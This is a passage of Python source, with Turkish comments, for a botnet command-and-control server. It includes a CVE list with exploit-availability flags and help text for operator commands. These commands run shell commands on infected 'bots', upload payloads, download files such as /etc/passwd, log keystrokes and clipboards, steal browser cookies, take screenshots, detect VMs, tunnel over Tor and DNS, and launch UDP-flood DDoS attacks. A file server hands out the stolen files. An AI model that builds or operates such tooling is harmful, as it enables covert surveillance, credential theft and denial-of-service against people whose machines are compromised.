                    {'cve': 'CVE-2023-25754', 'title': 'Elasticsearch 8.7.0 - Buffer Overflow', 'severity': 'HIGH', 'source': 'NVD', 'exploit_available': True},
                    {'cve': 'CVE-2023-25755', 'title': 'Elasticsearch 8.6.0 - Information Disclosure', 'severity': 'MEDIUM', 'source': 'NVD', 'exploit_available': False}
                ]
            }
            
            # Tüm exploit'leri topla
            all_exploits = []
            
            # OS exploit'leri
            for os_name, exploits in exploit_db.items():
                all_exploits.extend(exploits)
            
            # Servis exploit'leri
            for port, exploits in service_exploits.items():
                all_exploits.extend(exploits)
            
            # Yazılım exploit'leri
            for software, exploits in software_exploits.items():
                all_exploits.extend(exploits)
            
            # Duplicate'leri kaldır
            unique_exploits = []
            seen_cves = set()
            for exploit in all_exploits:
                if exploit['cve'] not in seen_cves:
                    unique_exploits.append(exploit)
                    seen_cves.add(exploit['cve'])
            
            # Severity'ye göre sırala
            severity_order = {'CRITICAL': 4, 'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
            unique_exploits.sort(key=lambda x: severity_order.get(x['severity'], 0), reverse=True)
            
            # Özet bilgileri
            total_exploits = len(unique_exploits)
            critical_count = len([e for e in unique_exploits if e.get('severity') == 'CRITICAL'])
            high_count = len([e for e in unique_exploits if e.get('severity') == 'HIGH'])
            medium_count = len([e for e in unique_exploits if e.get('severity') == 'MEDIUM'])
            low_count = len([e for e in unique_exploits if e.get('severity') == 'LOW'])
            available_count = len([e for e in unique_exploits if e.get('exploit_available')])
            
            print(f"\n\033[96m📊 Exploit Database Summary:\033[0m")
            print(f"  \033[96m•\033[0m Total Exploits: \033[93m{total_exploits}\033[0m")
            print(f"  \033[96m•\033[0m Critical: \033[91m{critical_count}\033[0m")
            print(f"  \033[96m•\033[0m High: \033[93m{high_count}\033[0m")
            print(f"  \033[96m•\033[0m Medium: \033[94m{medium_count}\033[0m")
            print(f"  \033[96m•\033[0m Low: \033[92m{low_count}\033[0m")
            print(f"  \033[96m•\033[0m Exploits Available: \033[95m{available_count}\033[0m")
            
            print(f"\n\033[95m🎯 Top Exploits (by Severity):\033[0m")
            print("-" * 100)
            
            for i, exploit in enumerate(unique_exploits[:20], 1):  # İlk 20 exploit
                severity_color = {
                    'CRITICAL': '🔴',
                    'HIGH': '🟠',
                    'MEDIUM': '🟡',
                    'LOW': '🟢'
                }.get(exploit.get('severity', 'UNKNOWN'), '⚪')
                
                exploit_icon = '✅' if exploit.get('exploit_available') else '❌'
                
                print(f"{i:2d}. {severity_color} {exploit.get('cve', 'N/A')}")
                print(f"     Title: {exploit.get('title', 'N/A')}")
                print(f"     Severity: {exploit.get('severity', 'N/A')}")
                print(f"     Source: {exploit.get('source', 'N/A')}")
                print(f"     Exploit: {exploit_icon}")
                print()
            
            if total_exploits > 20:
                print(f"\n\033[94m[*] Showing first 20 of {total_exploits} exploits\033[0m")
            
            print(f"\n\033[95m💡 Usage:\033[0m")
            print(f"  \033[96m•\033[0m This database contains real CVE information")
            print(f"  \033[96m•\033[0m Exploits are sorted by severity (Critical → Low)")
            print(f"  \033[96m•\033[0m ✅ = Exploit available, ❌ = No exploit available")
            print(f"  \033[96m•\033[0m Covers macOS, Windows, Linux, and common services")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing exploits: {str(e)}\033[0m")
    
    def _show_help(self):
        """Show komutları için yardım menüsü"""
        try:
            print("\n\033[95m📋 Show Commands Help:\033[0m")
            print("=" * 60)
            print("  \033[96m•\033[0m show exploits - Show comprehensive exploit database")
            print("  \033[96m•\033[0m show stats    - Show system statistics")
            print("  \033[96m•\033[0m show logs     - Show system logs")
            print("  \033[96m•\033[0m show config  - Show server configuration")
            print("  \033[96m•\033[0m show history - Show command history")
            print("  \033[96m•\033[0m show files   - Show file system info")
            print("  \033[96m•\033[0m show network - Show network information")
            print("  \033[96m•\033[0m show         - Show this help menu")
            print("\n\033[95m📋 Other Show Commands:\033[0m")
            print("  \033[96m•\033[0m list         - Show connected bots")
            print("  \033[96m•\033[0m server       - Show server information")
            print("  \033[96m•\033[0m security     - Show security status")
            print("  \033[96m•\033[0m p2p status   - Show P2P network status")
            print("  \033[96m•\033[0m alerts       - Show security alerts")
            print("  \033[96m•\033[0m web status   - Show web dashboard status")
            print("  \033[96m•\033[0m network_maps - Show network maps")
            print("\n\033[95m💡 Usage:\033[0m")
            print("  \033[96m•\033[0m Type 'show <command>' to execute")
            print("  \033[96m•\033[0m All show commands work offline (no bot communication)")
            print("  \033[96m•\033[0m Commands provide detailed system information")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing help: {str(e)}\033[0m")
    
    def _show_command_help(self, cmd):
        """Show help for specific command"""
        help_info = {
            'cmd': {
                'usage': 'cmd <bot_id> <command>',
                'description': 'Execute command on specific bot',
                'examples': [
                    'cmd Bot-123 whoami',
                    'cmd Bot-123 ls -la',
                    'cmd Bot-123 ipconfig'
                ]
            },
            'upload': {
                'usage': 'upload <bot_id> <local_file> [remote_name]',
                'description': 'Upload file to bot',
                'examples': [
                    'upload Bot-123 payload.exe',
                    'upload Bot-123 script.py remote_script.py'
                ]
            },
            'download': {
                'usage': 'download <bot_id> <remote_file> [local_path]',
                'description': 'Download file from bot',
                'examples': [
                    'download Bot-123 document.txt',
                    'download Bot-123 /etc/passwd passwd_file.txt'
                ]
            },
            'list': {
                'usage': 'list',
                'description': 'Show all connected bots',
                'examples': ['list']
            },
            'server': {
                'usage': 'server',
                'description': 'Show server information and status',
                'examples': ['server']
            },
            'security': {
                'usage': 'security',
                'description': 'Show security rules and status',
                'examples': ['security']
            },
            'alerts': {
                'usage': 'alerts',
                'description': 'Show security alerts from bots',
                'examples': ['alerts']
            },
            'processes': {
                'usage': 'processes <bot_id>',
                'description': 'Get process list from bot',
                'examples': ['processes Bot-123']
            },
            'keylogger': {
                'usage': 'keylogger <start|stop> <bot_id>',
                'description': 'Start or stop keylogger on bot',
                'examples': [
                    'keylogger start Bot-123',
                    'keylogger stop Bot-123'
                ]
            },
            'clipboard': {
                'usage': 'clipboard <start|stop> <bot_id>',
                'description': 'Start or stop clipboard monitoring on bot',
                'examples': [
                    'clipboard start Bot-123',
                    'clipboard stop Bot-123'
                ]
            },
            'tor': {
                'usage': 'tor <enable|disable|renew|status>',
                'description': 'Manage Tor service',
                'examples': [
                    'tor enable',
                    'tor disable',
                    'tor renew',
                    'tor status'
                ]
            },
            'dns_tunnel': {
                'usage': 'dns_tunnel <enable|disable|status> [domain]',
                'description': 'Manage DNS Tunneling service',
                'examples': [
                    'dns_tunnel enable c2domain.com',
                    'dns_tunnel disable',
                    'dns_tunnel status'
                ]
            },
            'web': {
                'usage': 'web <start|stop|status>',
                'description': 'Manage web dashboard',
                'examples': [
                    'web start',
                    'web stop', 
                    'web status'
                ]
            },
            'show': {
                'usage': 'show <exploits|stats|logs|config|history|files|network>',
                'description': 'Show various system information',
                'examples': [
                    'show stats',
                    'show logs',
                    'show config'
                ]
            },
            'broadcast': {
                'usage': 'broadcast <command>',
                'description': 'Send command to all connected bots',
                'examples': ['broadcast whoami']
            },
            'clear': {
                'usage': 'clear',
                'description': 'Clear the terminal screen',
                'examples': ['clear']
            },
            'exit': {
                'usage': 'exit',
                'description': 'Exit the C2 server',
                'examples': ['exit']
            },
            'help': {
                'usage': 'help',
                'description': 'Show all available commands',
                'examples': ['help']
            },
            'network_map': {
                'usage': 'network_map <start|status|stop> <bot_id> [scope]',
                'description': 'Manage network mapping on bots',
                'examples': [
                    'network_map start Bot-123',
                    'network_map start Bot-123 local',
                    'network_map status Bot-123',
                    'network_map stop Bot-123'
                ]
            },
            'keylogger': {
                'usage': 'keylogger <start|stop> <bot_id>',
                'description': 'Start or stop keylogger on bot',
                'examples': [
                    'keylogger start Bot-123',
                    'keylogger stop Bot-123'
                ]
            },
            'clipboard': {
                'usage': 'clipboard <start|stop> <bot_id>',
                'description': 'Start or stop clipboard monitoring on bot',
                'examples': [
                    'clipboard start Bot-123',
                    'clipboard stop Bot-123'
                ]
            },
            'cookies': {
                'usage': 'cookies <bot_id>',
                'description': 'Steal browser cookies from bot',
                'examples': ['cookies Bot-123']
            },
            'copy': {
                'usage': 'copy <start|stop> <bot_id>',
                'description': 'Start or stop clipboard logger on bot',
                'examples': [
                    'copy start Bot-123',
                    'copy stop Bot-123'
                ]
            },
            'screenshot': {
                'usage': 'screenshot <bot_id>',
                'description': 'Take screenshot from bot',
                'examples': ['screenshot Bot-123']
            },
            'ss': {
                'usage': 'ss <start|stop> <bot_id>',
                'description': 'Start or stop automatic screenshot capture (every 10 seconds)',
                'examples': [
                    'ss start Bot-123',
                    'ss stop Bot-123'
                ]
            },
            'ddos': {
                'usage': 'ddos <start|stop> <bot_id> <target_ip> [--duration <seconds>] [--threads <count>]',
                'description': '⚠️  DDoS attack management (EDUCATIONAL USE ONLY)',
                'details': [
                    '• Default duration: 30 seconds (max: 300)',
                    '• Default threads: 50 (max: 100)',
                    '• Attack type: UDP flood on port 80',
                    '• WARNING: Use only on your own systems!',
                    '• Malicious use is strictly prohibited'
                ],
                'examples': [
                    'ddos start Bot-123 192.168.1.100',
                    'ddos start Bot-123 192.168.1.100 --duration 60',
                    'ddos start Bot-123 192.168.1.100 --threads 25',
                    'ddos start Bot-123 192.168.1.100 --duration 120 --threads 75',
                    'ddos stop Bot-123'
                ]
            },
            'sysinfo': {
                'usage': 'sysinfo <bot_id>',
                'description': 'Get system information from bot',
                'examples': ['sysinfo Bot-123']
            },
            'isvm': {
                'usage': 'isvm <bot_id>',
                'description': 'Check if bot is running in virtual machine',
                'examples': ['isvm Bot-123']
            },
            'whoami': {
                'usage': 'whoami <bot_id>',
                'description': 'Get current user from bot',
                'examples': ['whoami Bot-123']
            },
            'pwd': {
                'usage': 'pwd <bot_id>',
                'description': 'Get current directory from bot',
                'examples': ['pwd Bot-123']
            },
            'ls': {
                'usage': 'ls <bot_id> [path]',
                'description': 'List directory contents on bot',
                'examples': [
                    'ls Bot-123',
                    'ls Bot-123 /home'
                ]
            }
        }
        
        if cmd in help_info:
            info = help_info[cmd]
            print(f"\n\033[95m📖 Help for '{cmd}' command:\033[0m")
            print(f"  \033[96m•\033[0m \033[93mUsage:\033[0m {info['usage']}")
            print(f"  \033[96m•\033[0m \033[93mDescription:\033[0m {info['description']}")
            print(f"  \033[96m•\033[0m \033[93mExamples:\033[0m")
            for example in info['examples']:
                print(f"    \033[92m{example}\033[0m")
            print()
        else:
            print(f"\033[91m[!] No help available for command: {cmd}\033[0m")
            print(f"\033[94m[*] Type 'help' to see all available commands\033[0m")
    
    def _show_stats(self):
        """Sistem istatistiklerini gösterir"""
        try:
            print("\n\033[95m📊 System Statistics:\033[0m")
            print("=" * 60)
            
            # Bot istatistikleri
            with self.lock:
                total_bots = len(self.bots)
                tor_bots = len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])
                clearnet_bots = total_bots - tor_bots
                
                # Platform istatistikleri
                platforms = {}
                for bot in self.bots.values():
                    platform = bot.get('platform', 'Unknown')
                    platforms[platform] = platforms.get(platform, 0) + 1
            
            print(f"  \033[96m•\033[0m Total Bots: \033[93m{total_bots}\033[0m")
            print(f"  \033[96m•\033[0m Tor Bots: \033[94m{tor_bots}\033[0m")
            print(f"  \033[96m•\033[0m Clearnet Bots: \033[92m{clearnet_bots}\033[0m")
            
            if platforms:
                print(f"  \033[96m•\033[0m Platform Distribution:")
                for platform, count in platforms.items():
                    print(f"     - {platform}: {count}")
            
            # P2P istatistikleri
            active_p2p = len([s for s in self.p2p_status.values() if s['status'] == 'active'])
            print(f"  \033[96m•\033[0m Active P2P Networks: \033[95m{active_p2p}\033[0m")
            
            # Güvenlik istatistikleri
            security_alerts = len(self.wireshark_alerts)
            print(f"  \033[96m•\033[0m Security Alerts: \033[91m{security_alerts}\033[0m")
            
            # Network maps istatistikleri
            network_maps_count = len(self.network_maps)
            print(f"  \033[96m•\033[0m Network Maps: \033[96m{network_maps_count}\033[0m")
            
            # Command queue istatistikleri
            queue_size = self.command_queue.qsize()
            print(f"  \033[96m•\033[0m Pending Commands: \033[93m{queue_size}\033[0m")
            
            # Uptime hesaplama
            import time
            uptime_seconds = int(time.time() - getattr(self, '_start_time', time.time()))
            uptime_hours = uptime_seconds // 3600
            uptime_minutes = (uptime_seconds % 3600) // 60
            uptime_secs = uptime_seconds % 60
            print(f"  \033[96m•\033[0m Server Uptime: \033[94m{uptime_hours}h {uptime_minutes}m {uptime_secs}s\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing stats: {str(e)}\033[0m")
    
    def _show_logs(self):
        """Sistem loglarını gösterir"""
        try:
            print("\n\033[95m📋 System Logs:\033[0m")
            print("=" * 60)
            
            # Log dosyalarını kontrol et
            log_files = [
                'download_log.json',
                'clipboard_data/',
                'cookies/',
                'network_maps/',
                'bot_files/'
            ]
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    if os.path.isfile(log_file):
                        size = os.path.getsize(log_file)
                        print(f"  \033[96m•\033[0m {log_file}: \033[93m{size:,} bytes\033[0m")
                    else:
                        file_count = len([f for f in os.listdir(log_file) if os.path.isfile(os.path.join(log_file, f))])
                        print(f"  \033[96m•\033[0m {log_file}: \033[93m{file_count} files\033[0m")
                else:
                    print(f"  \033[96m•\033[0m {log_file}: \033[91mNot found\033[0m")
            
            # Son aktiviteler
            print(f"\n\033[95m📊 Recent Activity:\033[0m")
            with self.lock:
                if self.bots:
                    recent_bots = sorted(self.bots.items(), key=lambda x: x[1]['last_seen'], reverse=True)[:5]
                    for bot_id, bot_info in recent_bots:
                        last_seen = time.ctime(bot_info['last_seen'])
                        print(f"  \033[96m•\033[0m {bot_id}: \033[90m{last_seen}\033[0m")
                else:
                    print("  \033[93m[!] No recent activity\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing logs: {str(e)}\033[0m")
    
    def _show_config(self):
        """Server konfigürasyonunu gösterir"""
        try:
            print("\n\033[95m⚙️ Server Configuration:\033[0m")
            print("=" * 60)
            
            print(f"  \033[96m•\033[0m Host: \033[93m{self.host}\033[0m")
            print(f"  \033[96m•\033[0m Port: \033[93m{self.port}\033[0m")
            print(f"  \033[96m•\033[0m Encryption: \033[93mAES-256-GCM\033[0m")
            print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Security Rules: \033[93m{'Enabled' if self.security_rules_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
            
            # Tor konfigürasyonu
            print(f"\n\033[95m🔒 Tor Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'Yes' if self.tor_enabled else 'No'}\033[0m")
            print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
            print(f"  \033[96m•\033[0m Tor Process: \033[93m{'Running' if self.tor_process else 'Stopped'}\033[0m")
            
            # Web dashboard konfigürasyonu
            print(f"\n\033[95m🌐 Web Dashboard Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Web Dashboard: \033[93m{'Enabled' if self.web_dashboard_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Web Host: \033[93m{self.web_dashboard_host}\033[0m")
            print(f"  \033[96m•\033[0m Web Port: \033[93m{self.web_dashboard_port}\033[0m")
            
            # Network mapping konfigürasyonu
            print(f"\n\033[95m🗺️ Network Mapping Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Network Maps: \033[93m{'Enabled' if self.network_maps_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Maps Directory: \033[93m{self.network_maps_dir}\033[0m")
            print(f"  \033[96m•\033[0m Total Maps: \033[93m{len(self.network_maps)}\033[0m")
            
            # Vulnerability scanner konfigürasyonu
            print(f"\n\033[95m🔍 Vulnerability Scanner Configuration:\033[0m")
            print(f"  \033[96m•\033[0m Scanner: \033[93m{'Enabled' if self.vuln_scanner_enabled else 'Disabled'}\033[0m")
            print(f"  \033[96m•\033[0m Sources: \033[93mNVD, ExploitDB, CVE Details, SecurityFocus, PacketStorm\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing config: {str(e)}\033[0m")
    
    def _show_history(self):
        """Komut geçmişini gösterir"""
        try:
            print("\n\033[95m📜 Command History:\033[0m")
            print("=" * 60)
            
            if self.command_history:
                print(f"  \033[96m•\033[0m Total Commands: \033[93m{len(self.command_history)}\033[0m")
                print(f"  \033[96m•\033[0m Max History: \033[93m{self.max_history}\033[0m")
                print(f"  \033[96m•\033[0m History File: \033[93m{self.history_file}\033[0m")
                
                print(f"\n\033[95m📋 Recent Commands (Last 10):\033[0m")
                recent_commands = self.command_history[-10:] if len(self.command_history) > 10 else self.command_history
                for i, cmd in enumerate(recent_commands, 1):
                    print(f"  \033[96m{i:2d}.\033[0m {cmd}")
                
                if len(self.command_history) > 10:
                    print(f"  \033[90m... and {len(self.command_history) - 10} more commands\033[0m")
                
                # En çok kullanılan komutları bul
                from collections import Counter
                command_counts = Counter(self.command_history)
                most_common = command_counts.most_common(5)
                
                print(f"\n\033[95m📊 Most Used Commands:\033[0m")
                for cmd, count in most_common:
                    print(f"  \033[96m•\033[0m {cmd}: \033[93m{count} times\033[0m")
                
            else:
                print("  \033[93m[!] No command history available\033[0m")
            
            print(f"\n\033[95m💡 Usage:\033[0m")
            print(f"  \033[96m•\033[0m Use ↑/↓ arrow keys to navigate history")
            print(f"  \033[96m•\033[0m Use Tab for command completion")
            print(f"  \033[96m•\033[0m History is saved to {self.history_file}")
            print(f"  \033[96m•\033[0m History persists across server restarts")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing history: {str(e)}\033[0m")
    
    def _show_files(self):
        """Dosya sistemi bilgilerini gösterir"""
        try:
            print("\n\033[95m📁 File System Information:\033[0m")
            print("=" * 60)
            
            # Ana dizinler
            directories = [
                'bot_files',
                'clipboard_data',
                'cookies',
                'network_maps',
                'downloads'
            ]
            
            for directory in directories:
                if os.path.exists(directory):
                    file_count = len([f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))])
                    dir_count = len([d for d in os.listdir(directory) if os.path.isdir(os.path.join(directory, d))])
                    print(f"  \033[96m•\033[0m {directory}/: \033[93m{file_count} files, {dir_count} directories\033[0m")
                else:
                    print(f"  \033[96m•\033[0m {directory}/: \033[91mNot found\033[0m")
            
            # Log dosyaları
            print(f"\n\033[95m📋 Log Files:\033[0m")
            log_files = ['download_log.json']
            for log_file in log_files:
                if os.path.exists(log_file):
                    size = os.path.getsize(log_file)
                    print(f"  \033[96m•\033[0m {log_file}: \033[93m{size:,} bytes\033[0m")
                else:
                    print(f"  \033[96m•\033[0m {log_file}: \033[91mNot found\033[0m")
            
            # Disk kullanımı
            print(f"\n\033[95m💾 Disk Usage:\033[0m")
            try:
                import shutil
                total, used, free = shutil.disk_usage('.')
                print(f"  \033[96m•\033[0m Total Space: \033[93m{total // (1024**3):,} GB\033[0m")
                print(f"  \033[96m•\033[0m Used Space: \033[93m{used // (1024**3):,} GB\033[0m")
                print(f"  \033[96m•\033[0m Free Space: \033[93m{free // (1024**3):,} GB\033[0m")
                print(f"  \033[96m•\033[0m Usage: \033[93m{(used/total)*100:.1f}%\033[0m")
            except Exception as e:
                print(f"  \033[91m[!] Error getting disk usage: {str(e)}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing files: {str(e)}\033[0m")
    
    def _show_network(self):
        """Network bilgilerini gösterir"""
        try:
            print("\n\033[95m🌐 Network Information:\033[0m")
            print("=" * 60)
            
            # Server network bilgileri
            print(f"  \033[96m•\033[0m Server Host: \033[93m{self.host}\033[0m")
            print(f"  \033[96m•\033[0m Server Port: \033[93m{self.port}\033[0m")
            print(f"  \033[96m•\033[0m IPv6 Support: \033[93m{'Enabled' if self.ipv6_enabled else 'Disabled'}\033[0m")
            
            # P2P network bilgileri
            print(f"\n\033[95m🔗 P2P Network:\033[0m")
            print(f"  \033[96m•\033[0m P2P Port Range: \033[93m{self.p2p_port_range}\033[0m")
            print(f"  \033[96m•\033[0m Active P2P Networks: \033[93m{len([s for s in self.p2p_status.values() if s['status'] == 'active'])}\033[0m")
            
            # Tor network bilgileri
            print(f"\n\033[95m🔒 Tor Network:\033[0m")
            print(f"  \033[96m•\033[0m Tor Enabled: \033[93m{'Yes' if self.tor_enabled else 'No'}\033[0m")
            print(f"  \033[96m•\033[0m Tor Port: \033[93m{self.tor_port}\033[0m")
            print(f"  \033[96m•\033[0m Tor Bots: \033[93m{len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])}\033[0m")
            
            # Network maps bilgileri
            print(f"\n\033[95m🗺️ Network Maps:\033[0m")
            print(f"  \033[96m•\033[0m Total Maps: \033[93m{len(self.network_maps)}\033[0m")
            print(f"  \033[96m•\033[0m Maps Directory: \033[93m{self.network_maps_dir}\033[0m")
            
            # Bot network bilgileri
            with self.lock:
                if self.bots:
                    print(f"\n\033[95m🤖 Bot Network:\033[0m")
                    print(f"  \033[96m•\033[0m Total Bots: \033[93m{len(self.bots)}\033[0m")
                    print(f"  \033[96m•\033[0m Tor Bots: \033[94m{len([bot for bot in self.bots.values() if bot.get('tor_enabled', False)])}\033[0m")
                    print(f"  \033[96m•\033[0m Clearnet Bots: \033[92m{len([bot for bot in self.bots.values() if not bot.get('tor_enabled', False)])}\033[0m")
                    
                    # Bot IP'leri
                    print(f"  \033[96m•\033[0m Bot IPs:")
                    for bot_id, bot_info in list(self.bots.items())[:5]:  # İlk 5 bot
                        ip = bot_info.get('ip', 'Unknown')
                        tor_status = " (Tor)" if bot_info.get('tor_enabled', False) else ""
                        print(f"     - {bot_id}: {ip}{tor_status}")
                    
                    if len(self.bots) > 5:
                        print(f"     ... and {len(self.bots) - 5} more bots")
                else:
                    print(f"\n\033[95m🤖 Bot Network:\033[0m")
                    print(f"  \033[93m[!] No bots connected\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Error showing network: {str(e)}\033[0m")
    
    def _process_network_map(self, bot_id, network_data, map_format, scope, timestamp):
        """Network map verilerini işler ve kaydeder"""
        try:
            # Güvenli dosya adı oluştur
            safe_scope = scope.replace('/', '_').replace('\\', '_').replace(':', '_')
            safe_timestamp = datetime.fromtimestamp(timestamp).strftime('%Y%m%d_%H%M%S')
            filename = f"map_{safe_scope}_{safe_timestamp}"
            
            # Bot için dizin oluştur
            bot_dir = os.path.join(self.network_maps_dir, bot_id)
            os.makedirs(bot_dir, exist_ok=True)
            
            # JSON verilerini kaydet
            json_file = os.path.join(bot_dir, f"{filename}.json")
            with open(json_file, 'w', encoding='utf-8') as f:
                json.dump(network_data, f, indent=2, ensure_ascii=False)
            
            # Mermaid diyagramı oluştur
            mermaid_content = self._create_mermaid_diagram(network_data)
            mermaid_file = os.path.join(bot_dir, f"{filename}.mmd")
            with open(mermaid_file, 'w', encoding='utf-8') as f:
                f.write(mermaid_content)
            
            # Markdown raporu oluştur
            markdown_content = self._create_markdown_report(network_data, scope, timestamp)
            markdown_file = os.path.join(bot_dir, f"{filename}.md")
            with open(markdown_file, 'w', encoding='utf-8') as f:
                f.write(markdown_content)
            
            # Network map verilerini kaydet
            with self.lock:
                self.network_maps[bot_id] = {
                    'scope': scope,
                    'timestamp': timestamp,
                    'nodes_count': len(network_data.get('nodes', [])),
                    'links_count': len(network_data.get('links', [])),
                    'files': {
                        'json': json_file,
                        'mermaid': mermaid_file,
                        'markdown': markdown_file
                    }
                }
            
            print(f"\033[92m[+] Network map kaydedildi: {bot_id} - {scope}")
            print(f"\033[94m[*] Dosyalar: {bot_dir}\033[0m")
            
        except Exception as e:
            print(f"\033[91m[!] Network map işleme hatası: {str(e)}\033[0m")
    
    def _create_mermaid_diagram(self, network_data):
        """Network verilerinden Mermaid diyagramı oluşturur"""
        nodes = network_data.get('nodes', [])
        links = network_data.get('links', [])
        
        mermaid_lines = ["graph TD"]
        
        # Node'ları ekle
        for node in nodes:
            node_id = node.get('id', 'unknown')
            ip = node.get('ip', 'N/A')
            hostname = node.get('hostname', 'N/A')
            mac = node.get('mac', 'N/A')
            os_guess = node.get('os_guess', 'Unknown')
            role = node.get('role', 'unknown')
            
            # Node etiketi oluştur
            label = f"{ip}<br/>{hostname}<br/>MAC: {mac}<br/>OS: {os_guess}<br/>Role: {role}"
            
            mermaid_lines.append(f"    {node_id}[\"{label}\"]")
        
        # Link'leri ekle
        for link in links:
            source = link.get('source', '')
            target = link.get('target', '')
            protocol = link.get('protocol', 'ip')
            rtt = link.get('rtt_ms', '')
            
            if rtt:
                mermaid_lines.append(f"    {source} -->|{protocol} ({rtt}ms)| {target}")
            else:
                mermaid_lines.append(f"    {source} -->|{protocol}| {target}")
        
        return "\n".join(mermaid_lines)
    
    def _create_markdown_report(self, network_data, scope, timestamp):
        """Network verilerinden Markdown raporu oluşturur"""
        nodes = network_data.get('nodes', [])
        links = network_data.get('links', [])
        
        report = f"""# Network Map Raporu

## Genel Bilgiler
- **Kapsam**: {scope}
- **Tarih**: {datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')}
- **Toplam Cihaz**: {len(nodes)}
- **Toplam Bağlantı**: {len(links)}

## Cihaz Listesi

| IP | Hostname | MAC | OS | Role | Servisler |
|---|---|---|---|---|---|
"""
        
        for node in nodes:
            ip = node.get('ip', 'N/A')
            hostname = node.get('hostname', 'N/A')
            mac = node.get('mac', 'N/A')
            os_guess = node.get('os_guess', 'Unknown')
            role = node.get('role', 'unknown')
            services = node.get('services', [])
            
            services_str = ", ".join([f"{s.get('port', '')}/{s.get('proto', '')}" for s in services])
            
            report += f"| {ip} | {hostname} | {mac} | {os_guess} | {role} | {services_str} |\n"
        
        report += "\n## Bağlantılar\n\n"
        
        for link in links:
            source = link.get('source', 'source')
            target = link.get('target', 'target')
            protocol = link.get('protocol', 'ip')
            rtt = link.get('rtt_ms', 'N/A')
            
            report += f"- **{source}** → **{target}** ({protocol}, {rtt}ms)\n"
        
        return report
    
    def get_network_maps_status(self):
        """Network maps durumunu döndürür"""
        return {
            'enabled': self.network_maps_enabled,
            'total_maps': len(self.network_maps),
            'maps': self.network_maps
        }

class FileServerHandler(BaseHTTPRequestHandler):
    def __init__(self, c2_server, *args, **kwargs):
        self.c2_server = c2_server
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        try:
            # Parse URL and query parameters
            parsed_path = urlparse(self.path)
            params = parse_qs(parsed_path.query)
            
            # Check authentication
            bot_id = params.get('bot_id', [''])[0]
            token = params.get('token', [''])[0]
            
            if not self.authenticate(bot_id, token):
                self.send_error(401, 'Unauthorized')
                return
            
            # Handle file download
            if parsed_path.path == '/download':
                filename = params.get('file', [''])[0]
                if not filename:
                    self.send_error(400, 'Missing file parameter')
                    return
                
                filepath = os.path.join('bot_files', bot_id, filename)
                if not os.path.exists(filepath):
                    self.send_error(404, 'File not found')
                    return
                
                self.send_response(200)
                self.send_header('Content-type', 'application/octet-stream')
                self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
                self.end_headers()
                
                with open(filepath, 'rb') as f:
                    self.wfile.write(f.read())
                
            # Handle file list
            elif parsed_path.path == '/list':
                bot_dir = os.path.join('bot_files', bot_id)
                if not os.path.exists(bot_dir):
                    os.makedirs(bot_dir, exist_ok=True)
                
                files = [f for f in os.listdir(bot_dir) if os.path.isfile(os.path.join(bot_dir, f))]
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success', 'files': files}).encode())
                
            else:
                self.send_error(404, 'Not Found')
                
        except Exception as e:
            self.send_error(500, f'Server error: {str(e)}')
    
    def authenticate(self, bot_id, token):
        if not bot_id or not token:
            return False
            
        if bot_id not in self.c2_server.file_server_tokens:
            return False
            
        token_info = self.c2_server.file_server_tokens[bot_id]
        if token_info['token'] != token or time.time() > token_info['expiry']:
            return False
            
        return True

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
    daemon_threads = True

def start_file_server(c2_server, host='0.0.0.0', port=8000):
    """Start the file server in a separate thread."""
    def run_server():
        server_address = (host, port)
        httpd = ThreadedHTTPServer(server_address, lambda *args: FileServerHandler(c2_server, *args))
        c2_server.file_server = httpd
        print(f"[+] File server started on http://{host}:{port}")
        httpd.serve_forever()
    
    thread = threading.Thread(target=run_server, daemon=True)
    thread.start()
    return thread

# Add file server commands to C2Server
C2Server.commands.update({
    'fileserver': 'Start/stop file server',
    'token': 'Generate file access token',
    'upload': 'Upload file to bot',
    'download': 'Download file from bot'
})

if __name__ == '__main__':
    server = C2Server()
    server.start()